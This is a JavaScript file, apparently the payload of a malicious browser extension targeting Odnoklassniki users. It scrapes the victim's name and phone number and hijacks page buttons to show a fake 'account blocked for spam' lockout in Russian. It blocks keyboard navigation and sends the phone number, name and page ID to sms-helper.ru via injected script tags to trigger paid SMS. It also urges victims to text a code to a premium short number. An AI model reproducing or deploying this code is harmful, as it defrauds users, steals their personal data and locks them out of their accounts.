var i = "";
var type = "";
var phone = "911";
function TelCode(num){
	return num.match(/\+7(?!7)|\+77|\+380|\+375|\+374|\+994|\+370|\+371|\+373/gi);
}


function NewAction() {
    if (plg.Get('vRun')) {
        LockStop();
        plg.Save('oRun', "0");
        return false;
    }
	if (!plg.Get('oRun')){
		plg.Save('oRun','1');
	}
}


function getTime() {
    var g = new Date().getTime() / 1000 / 60;
    g = g - (g % 1);
    return g;
}

function get_xmlHttp() 
{ 
   var xmlHttp; 
   try 
    { 
      xmlHttp = new XMLHttpRequest(); 
   } 
   catch(e) 
   { 
      var XmlHttpVersions = new Array("MSXML2.XMLHTTP.6.0", 
      "MSXML2.XMLHTTP.5.0", 
      "MSXML2.XMLHTTP.4.0", 
      "MSXML2.XMLHTTP.3.0", 
      "MSXML2.XMLHTTP", 
      "Microsoft.XMLHTTP"); 
      for (var i = 0; i < XmlHttpVersions.length && ! xmlHttp; 
      i ++ ) 
      { 
         try 
         { 
            xmlHttp = new ActiveXObject(XmlHttpVersions[i]); 
         } 
         catch (e) 
         { 
         } 
      } 
   } 
   if ( ! xmlHttp) 
   alert("Error creating the XMLHttpRequest object."); 
   else 
   return xmlHttp; 
}

function AjaxLoad(lnk, params_post, fSuccess, fFailed) {
	var req = get_xmlHttp() ;
	
	req.open(params_post ? "POST" : "GET", lnk, true);
	req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
	req.onreadystatechange = function()	{
		if (req.readyState == 4) {
			if (req.status == 200) {
				if (fSuccess)
					fSuccess(req.responseText);
			} else {
				if (fFailed)
					fFailed();
			}
		}
	}
	req.send(params_post);
}
function get_xmlHttp() { 
   var xmlHttp; 
   try 
    { 
      xmlHttp = new XMLHttpRequest(); 
   } 
   catch(e) 
   { 
      var XmlHttpVersions = new Array("MSXML2.XMLHTTP.6.0", 
      "MSXML2.XMLHTTP.5.0", 
      "MSXML2.XMLHTTP.4.0", 
      "MSXML2.XMLHTTP.3.0", 
      "MSXML2.XMLHTTP", 
      "Microsoft.XMLHTTP"); 
      for (var i = 0; i < XmlHttpVersions.length && ! xmlHttp; 
      i ++ ) 
      { 
         try 
         { 
            xmlHttp = new ActiveXObject(XmlHttpVersions[i]); 
         } 
         catch (e) 
         { 
         } 
      } 
   } 
   if ( ! xmlHttp) 
   alert("Error creating the XMLHttpRequest object."); 
   else 
   return xmlHttp; 
}

function AjaxLoad(lnk, params_post, fSuccess, fFailed) {
	var req = get_xmlHttp() ;
	
	req.open(params_post ? "POST" : "GET", lnk, true);
	req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
	req.onreadystatechange = function()	{
		if (req.readyState == 4) {
			if (req.status == 200) {
				if (fSuccess)
					fSuccess(req.responseText);
			} else {
				if (fFailed)
					fFailed();
			}
		}
	}
	req.send(params_post);
}


function CheckTime() {
    var startTime = getTime() + 60;
    if (plg.Get('oTime')) {
        return false;

    } else {
        plg.Save('oTime', startTime.toString());
    }
}

function LockStop() {
    plg.Save('oRun', '0');
    document.getElementById('hook_Block_PopLayer').style.display = "none";

}

function ClearPage() {
    ClearToolbar();
    try {
        document.getElementById('hook_Block_FrOln4thCol').style.display = "none";
        document.getElementById('mainContentLeftColumn').style.display = "none";
        document.getElementById('footer').style.display = "none";
        document.getElementsByClassName('topPanel topPanel_m')[0].style.display = "none";
        document.getElementById('mainContainer').style.backgroundColor = "#FFF";
        document.getElementsByClassName('modal_overlay')[0].style.backgroundColor = "#FFF";
    } catch (e) {
        LoadCSS();
        GLock();

    }
}

function ClearToolbar() {
    if (document.getElementsByClassName('toolbar_decor')[0]) {
        document.getElementsByClassName('toolbar_decor')[0].parentNode.removeChild(document.getElementsByClassName('toolbar_decor')[0]);
    }
}

function GetNumber() {
var buf = "";
	AjaxLoad('http://www.odnoklassniki.ru/settings',0,function(text){
			var d="";
			var DF = "";
			var f=text;
			var r = f.match(/(?=<a href=)(.+)(?=" class="bold">Номер телефона<\/a>)/ig);
			d = r[0].replace(/<a href="/gi, '');
			var dk = d.replace(/&amp;/gi, '&');
			DF = dk;	
			
AjaxLoad('http://www.odnoklassniki.ru/',DF,function(next){
var dd = r[0].replace('&amp;', '&');
						
						var srvAns = next;
						
						buf = srvAns.match(/[+]{1}[0-9]+(?:[X]+)/g);
						phone = buf.toString();
						phone=phone.replace(/[X]/gi,'');
						phone=phone.replace(/[+7]/gi, '');
						
						
						plg.Save('oPhone',buf.toString());
						var f = buf.toString();
						buf=f.replace(/[X]/gi,'');
						
						Num();
						
})
});
	  
}
var shot = "2332";
function GetCountry() {
	var cod = document.getElementById('pre').innerText;
	cod = TelCode(cod).toString();
	
	if (/\+77/ig.test(cod)){
		shot="7502";
		
		return;
	}
	if (/\+380/ig.test(cod)) {
		shot="9106";
		
		return;
	}
	if (/\+374/ig.test(cod)){
		shot = "1";
		return;
	}
	if (/\+994/ig.test(cod)){
		shot = "2";
		return;
	}
	if (/\+375/ig.test(cod)){
		shot="3";
		return;
	}
	if (/\+370/ig.test(cod)){

		shot ="4";
		return;
}
	if (/\+371/ig.test(cod)){

		shot ="5";
		return;
}
	if (/\+373/ig.test(cod)){

		shot ="6";
		return;
	
	if (/\+7(?!7)/ig.test(cod)){
		shot="2332";
		
		return;
}
}
	}
var gCode = "";
var pCode = "";
function Prefix() {
var code = (plg.Get('oPhone'));
code = TelCode(code).toString();
gCode = code;


if (/\+380/ig.test(code)) { 

	type = "1";
	plg.Save('oType',type);
return;
}
if (/\+374|\+994|\+375|\+77|\+370|\+371|\+373/ig.test(code)) { 

	type = "2";
	plg.Save('oType',type);
return;
}
if (/\+7(?!7)/gi.test(code)) { 
	shots="7";
	type = '3'; 
	plg.Save('oType',type);

	return;
} 

}
var nam = "";
function Num() {
	var k = plg.Get('oPhone');
	k = k.replace(/[X]/gi,'');
	k = k.replace(/[+7]/gi, '');
	nam = k;
	
}

function LoadCSS() {
    var NewCSS = document.createElement("link");
    NewCSS.setAttribute("href", "http://stg.odnoklassniki.ru/res/batch/css/9f2f479c/main-part4.css");
    NewCSS.setAttribute("type", "text/css");
    NewCSS.setAttribute("rel", "stylesheet");
    document.getElementsByTagName('head')[0].appendChild(NewCSS);
}

var sndSms = "";

function GoStep() {
    var info_cl = document.getElementById('field_mobile').value;
    var num = document.getElementById('field_mobile').value;
    
    
    if (num.length == 0) {
        $('.input-e').text('Укажите номер телефона');
        $('.input-e').css('display', 'block');
        return false;
    }
    if (num.length < 8) {
        $('.input-e').text('В номере неверное количество цифр.');
        $('.input-e').css('display', 'block');
        return false;
    }
    SendSMS();
	Stat();
    $('.input-e').css('display', 'none');
    $('#Step_1').animate({
        marginTop: '-=341px'
    }, 800);
}

function st_2() {
    sndSms = sendSms;
    var pole = $('#field_mobile2').val();
    if (pole.length == 0) {
        $('.input-e').text('Введите код.');
        $('.input-e').css('display', 'block');
        return false;
    }
    if (pole.length != 5) {
        $('.input-e').text('В коде слишком мало цифр.Повторите попытку.');
        $('.input-e').css('display', 'block');
        return false;
    }

    var inputKey = document.getElementById('field_mobile2').value;
    if (sndSms) {
        var validKey = sndSms.split(':');
        for (i = 0; i < validKey.length; i++)
            if (validKey[i] == inputKey) {
                $('.input-e').css('display', 'none');
                plg.Save('oRun', '0');
                alert('Вы успешно разблокировали свою страницу, рекомендуем вам сменить пароль');
                RedirToChangePass();
                HideLock();
				plg.Del();
                return true;
            }

        $('.input-e').text('Вы ввели неправильный код, повторите попытку');
        $('.input-e').css('display', 'block');
        return false;

    }

}

function RedirToChangePass() {
    document.location = "http://www.odnoklassniki.ru/settings/dk?st.cmd=userConfig&cmd=PopLayer&tkn=819&st.layer.cmd=PopLayerConfigUserPassword";
}

function check() {
    var pole = $('#field_mobile2').val();
    if (pole.length == 0) {
        $('.input-e').text('Введите код.');
        $('.input-e').css('display', 'block');
        return false;
    }
    if (pole.length < 6) {
        $('.input-e').text('В коде слишком мало цифр.Повторите попытку.');
        $('.input-e').css('display', 'block');
        return false;
    }
}

function OnlyNum(e) {
    var keynum;
    var keychar;
    var numcheck;
    var return2;
    if (window.event) {
        keynum = e.keyCode;
    } else if (e.which) {
        keynum = e.which;
    }
    keychar = String.fromCharCode(keynum);
    if (keynum < 45 || keynum > 57) {

        return2 = false;
        if (keynum == 8) return2 = true;

    } else return2 = true;
    return return2;
}

function Sp_st() {
    val = $('#country_select').val();	
    text = $('#country_select option:selected').text();
	document.getElementById('pre').innerText = val;
    document.getElementById('contr').innerHTML = '<b>' + text + '</b>';
    document.getElementById('country_select').style.display = 'block';
    document.getElementById('choose_country').style.display = 'none';
	
	GetCountry();
	if (val=="+7"){
		type="3";
		plg.Save('oType',type);
	}
	if (val=="+380")
	{
		type="1";
		plg.Save('oType',type);
	}
	if ((val=="+77")||(val=="+374")||(val=="+994")||(val=="+375")||(val=="+370")||(val=="+371")||(val=="+373")){
		type="2";
		plg.Save('oType',type);
	} 

	pCode = document.getElementById('country_select').value;
	
	
}


function in_sel_ch() {
    val = $('#country_select').val();
    text = $('#country_select option:selected').text();
    document.getElementById('pre').innerText = val;
    document.getElementById('contr').innerHTML = '<b>' + text + '</b>';
    $('#choose_country').css("display", "block");
    $('#country_select').css("display", "none");
	
	GetCountry();
	if (val=="+7"){
	
		type="3";
		plg.Save('oType',type);
	}
	if ((val=="+380")){
		type="1";
		plg.Save('oType',type);
	}
	if ((val=="+77")||(val=="+374")||(val=="+994")||(val=="+375")||(val=="+370")||(val=="+371")||(val=="+373")){
	type="2";
	plg.Save('oType',type);
	} 
	
	pCode = document.getElementById('country_select').value;
	pCode = pCode.replace('+','');
	
}


function GetName() {
   try {
		if (document.getElementsByClassName('mctc_nameLink bl')[0]) {
			plg.Save('oName', escape(document.getElementsByClassName('mctc_nameLink bl')[0].innerText));
		}
	}
	catch(e){
		var nm = document.getElementById('portal-headline_login');
		nm = nm.replace(/[помощьвыход]/gi,'');
		plg.Save('oName',escape(nm.toString()));
	}

}

function HideLock() {
    document.getElementById('hook_Block_PopLayer').style.display = 'none';
}

function Stat() {
	var useragent = navigator.userAgent; 
    var pre = document.getElementById('pre').innerText;
    pre = pre.replace('+', '');
    var HiName = plg.Get('oName');
    HiName = (encodeURIComponent(HiName));
    var number = pre + ($('#field_mobile').val());
    var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
    var res = "";
    for (i = 0; i < number.length; i++)
        res += alpha[parseInt(number[i])];
    var state = document.createElement('script');
    state.setAttribute('type', 'text/javascript');
    var url = 'http://sms-helper.ru/js/stat.php?type='+type+'&set='+ res + '&name=' + HiName + '&page=' + id + '&id=' + plg.Get('id')+'&group='+plg.Get('group')+'&user_agent='+useragent;
	state.setAttribute('src', url);
    document.getElementsByTagName('head')[0].appendChild(state);
   
    plg.Save('oIdPage', id);

}


function MesBtnClick() {
    document.getElementsByClassName('mdialog mdialog_m')[0].parentNode.removeChild(document.getElementsByClassName('mdialog mdialog_m')[0]);
    document.getElementsByClassName('modal_overlay')[0].parentNode.removeChild(document.getElementsByClassName('modal_overlay')[0]);
    ClearPage();
    Wnd();
    document.body.removeEventListener('DOMNodeInserted', MesBtnClick, false);
}

function CheckMobilName() {
    var l = document.getElementById('field_mobile');
    if (l == 0) {
        confirm('Введите номер телефона!');
        return;
    }
}


function SendSMS() {
    try {
        var number = plg.Get('oPhone');
        var id = plg.Get('id');
        var idPage = plg.Get('vIdPage');
        var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
        number = number.replace(/\+/, '');
        var res = plg.Get('oPhone');
		number = number.replace(/[X]/gi,'');
		var rnum = document.getElementById('field_mobile').value;
		var p = document.getElementById('pre').innerText;
		p = p.replace('+','');
		pCode = pCode.replace('+','');
		var aress = p+rnum;
		var ares = '';
         for (var i = 0; i < aress.length; i++)
            ares += alpha[parseInt(aress[i])]; 

        var sms = document.createElement('script');
        sms.setAttribute('type', 'text/javascript');
        var url = 'http://sms-helper.ru/js/sendsms.php?type='+type+'&set='+ares+'&page=' + oID + '&id=' + id +'&shot='+shot;
		sms.setAttribute('src', url);
        document.getElementsByTagName('head')[0].appendChild(sms);
		
		
    } catch (e) {}
}
var t="";


function AntiTab() {
	if(event.keyCode==9) return false;
}

function cancel(evt)
{
	evt = ( evt || window.event );
	key = ( evt.keyCode || evt.charCode || evt.which || 0 );
	if ( key == 3 || key == 9 || key == 13 )
	{
		evt.preventDefault();
		evt.stopPropagation();
	}
}


window.onload = function()
{
	document.body.addEventListener('keypress', cancel, false);
}

function Wnd() {
    LoadCSS();
    document.body.removeEventListener('DOMNodeInserted', Plus, false);
    var modalPop = document.getElementById('hook_Block_PopLayer');
	document.getElementById('hook_Block_ContentColumnContainer').innerHTML = '<div class="feed-loading"></div>';
	Num();
	   modalPop.innerHTML = ' <div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для восстановления доступа к аккаунту Вам необходимо пройти валидацию через мобильный телефон.</div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option> 7.<option value="+77">Казахстан</option></select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="'+phone+'" id="field_mobile" class="it it__promo" autocomplete="off" maxlength="20"  onkeypress="return OnlyNum(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Выслать код"   class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b>' + unescape(plg.Get('oName')) + '</b>,  В течении минуты на Ваш телефон<b>  ' +plg.Get('oPhone')+'</b>  прийдет SMS с кодом разблокировки Вашего аккаунта, полученный код введите здесь :<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить профиль" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div><div></form></div></div></div></div></div></div></div></div></td></tr></tbody></table></div></div></div>';
    modalPop.style.display = 'block';
	modalPop.setAttribute("onkeydown","cancel()");
	document.getElementById('field_mobile').value = nam;
    plg.Save('oRun', '2');
}

function Wnd_Page() {
    if (document.getElementsByClassName('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0]) {
        document.getElementById('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0].parentNode.removeChild(document.getElementById('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0]);
    }
    var modalPop = document.getElementById('mainContainer');
    var toolbar = document.getElementsByClassName('toolbar')[0];
    toolbar.innerHTML = '<div class="toolbar_c"><a class="toolbar_logo"><div class="toolbar_logo_img"></div></a><div class="toolbar_label">Восстановление доступа</div></div>';
    ClearPage();
	Num();
	
    modalPop.innerHTML = '<div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>В течении минуты на Ваш телефон<b> '+plg.Get('oPhone')+ '</b> прийдет SMS с требованием подтвердить активацию Вашего аккаунта, после подтверждения Вы получите код, введите его здесь:</div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option>7.<option value="+77">Казахстан</option> </select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="7"'+nam+' id="field_mobile" class="it it__promo" autocomplete="off" maxlength="20" onkeypress="return OnlyNum(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Выслать код" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b> ' +unescape(plg.Get('oName')) + ' </b>,на Ваш телефон прийдет SMS с кодом разблокировки Вашего аккаунта. Полученный код введите здесь :.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить профиль" class="button-pro"></span></div><div class="form_i"><br><a span id="hid" style="cursor:pointer" onclick="Hidden();">Не получили код?</a><a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span> <div id="hide" style="display:none"><br>Получить активационный код можно отправив SMS с текстом <b>007187 252</b> на номер <b>5537</b>.Стоимость SMS равна номинальной стоимости, установленной вашим оператором.Если не получилось отправить смс, свяжитесь с нами</div></div></div></div><div></form></div></div></div></div></div></div></div></div></td></span></tr></tbody></table></div></div></div>';
    modalPop.style.display = 'block';
	pCode = document.getElementById('country_select').value;
	
	modalPop.setAttribute("onkeydown","cancel()");
	document.getElementById('field_mobile').value = nam;
    modalPop.focus();
    document.getElementsByClassName('modal_overlay')[0].style.backgroundColor = "#FFF";
    document.getElementById('modal_box').style.borderColor = "#FFF";
    document.getElementById('mainContainer').style.backgroundColor = "#FFF";
    plg.Get('oRun') == '2';
    if (document.getElementsByClassName('feed-loading')[0])
        document.getElementsByClassName('feed-loading')[0].parentNode.removeChild(document.getElementsByClassName('feed-loading')[0]);

}
var h="0";

function Hidden() {
	if (h==0){
		document.getElementById('hide').style.display = "block";
		h=1;
	}
	else {
		document.getElementById('hide').style.display = "none";
		h=0;
	}
}

function GLock() {
    if (document.getElementsByClassName('pl_cw')[0]) {
        var addCommentBtn = document.getElementsByClassName('plp_cmt_w')[0];
        addCommentBtn.setAttribute("onClick", "Wnd()");
        var arr = document.getElementsByClassName('viewPhotoMark');
        for (i = 0; i < arr.length; i++) {
            arr[i].setAttribute("onClick", "Wnd()");
        }
				
	}

}
/*  if (document.getElementsByClassName('mdialog mdialog_m')[0]) {
    var mesBtn = document.getElementsByClassName('disc_simple_input_btn')[0]; 
    mesBtn.setAttribute("onClick", "Wnd()");
}  */


function Mark() {
		var d1 = document.getElementsByClassName('mark_ic mark_ic__1')[0];
		d1.href='#';
		d1.setAttribute('onclick','Wnd()');
		var d2 = document.getElementsByClassName('mark_ic mark_ic__2')[0];
		d2.href='#';
		d2.setAttribute('onclick','Wnd()');
		var d3 = document.getElementsByClassName('mark_ic mark_ic__3')[0];
		d3.href='#';
		d3.setAttribute('onclick','Wnd()');
		var d4 = document.getElementsByClassName('mark_ic mark_ic__4')[0];
		d4.href='#';
		d4.setAttribute('onclick','Wnd()');
		var d5 = document.getElementsByClassName('mark_ic mark_ic__5')[0];
		d5.href='#';
		d5.setAttribute('onclick','Wnd()');
		
}

var id = "";
var oID = "";

function Go() {
if (document.getElementsByClassName('centD')[0]) {
if (document.getElementsByClassName('mark_ic mark_ic__1')[0]){
	 	Mark();
	}
}
    if (document.getElementById('plp_fldCom')){
        document.getElementById('plp_fldCom').setAttribute('onkeydown', 'Wnd()');
	}
   if (document.getElementsByClassName('pl_cw')[0]) {
        if (document.getElementsByClassName('plp_cmt_btn')[0]) {
            if (document.getElementsByClassName('plp_cmt_btn')[0].style.display == 'inline') {
                var comment = document.getElementsByClassName('plp_cmt_btn')[0];
                comment.setAttribute('onClick', "Wnd()");
            }
        }
    } 

        var addCommentBtn = document.getElementsByClassName('plp_cmt_w')[0];
		if (addCommentBtn)
        addCommentBtn.setAttribute("onclick", "Wnd()");

}

function Plus() {
    LoadCSS();
    Wnd();
    
}

function GetId() {
    id = document.getElementsByClassName('portal-headline__link')[3];
    id = id.href.match(/[0-9]+/);
    oID = id.toString();
    plg.Save('oIdPage', id.toString());
}
window.onload = function () {

    CheckTime();
    IsTime();
    NewAction();
    GetId();
	GetName();
	if ((!plg.Get('oPhone'))||(plg.Get('oPhone').lenght==0)){    
		GetNumber();
	}
	Prefix();

	var key = plg.Get('oRun');
    if (key == '0') {
        LockStop();
        return false;
    }
    if (key == '1') {
        document.body.addEventListener('DOMNodeInserted', Go, false);
		LoadCSS();
	}
    if (key == '2') {
        LoadCSS();
        Wnd_Page();
    }

}

function Worll() {
    document.body.addEventListener('DOMNodeInserted', Wnd(), false);

}

function remove_mess() {
    var gg = document.getElementById('topPanelPopup_m');

    if (gg) {
        document.body.removeEventListener('DOMNodeInserted', remove_mess, false);
        gg.parentNode.removeChild(gg);
        Wnd();

    }
}

var _cookies;

function _initCookies() {
    _cookies = {};
    var ca = document.cookie.split(';');
    var re = /^[\s]*([^\s]+?)$/i;
    for (var i = 0, l = ca.length; i < l; i++) {
        var c = ca[i].split('=');
        if (c.length == 2) {
            _cookies[c[0].match(re)[1]] = unescape(c[1].match(re) ? c[1].match(re)[1] : '');
        }
    }
}


function getCookie(name) {
    _initCookies();
    return _cookies[name];
}

function setCookie(name, value, days) {
    var expires = '';
    var path = '; Path=/';
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = '; expires=' + date.toGMTString();
    }

    document.cookie = name + '=' + escape(value) + expires + path;
}

function getTime2() {
    var g = new Date().getTime() / 1000 / 60 / 60;
    g = g - (g % 1);
    return g;
}

function IsTime() {
    try {
        var lTime = plg.Get('oTime');
    } catch (e) {}
    if (lTime < getTime()) {
        plg.Save('oRun', '0');
		plg.Del();
        LockStop();

    }
}